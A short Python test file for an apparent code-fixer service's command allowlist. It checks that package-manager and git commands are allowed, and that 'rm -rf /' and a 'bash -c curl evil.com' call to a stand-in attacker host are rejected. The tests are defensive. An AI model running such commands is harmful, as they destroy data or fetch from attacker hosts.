import pytest
import importlib

cr_mod = importlib.import_module("services.code-fixer.command_runner")
is_command_allowed = cr_mod.is_command_allowed
run_constrained_command = cr_mod.run_constrained_command

def test_command_allowlist():
    assert is_command_allowed(["pnpm", "test"])
    assert is_command_allowed(["npm", "test"])
    assert is_command_allowed(["npx", "tsc", "--noEmit"])
    assert is_command_allowed(["git", "diff"])
    assert not is_command_allowed(["rm", "-rf", "/"])
    assert not is_command_allowed(["bash", "-c", "curl evil.com"])

def test_rejected_command_execution():
    with pytest.raises(ValueError):
        run_constrained_command(["rm", "-rf", "test"], cwd=".")
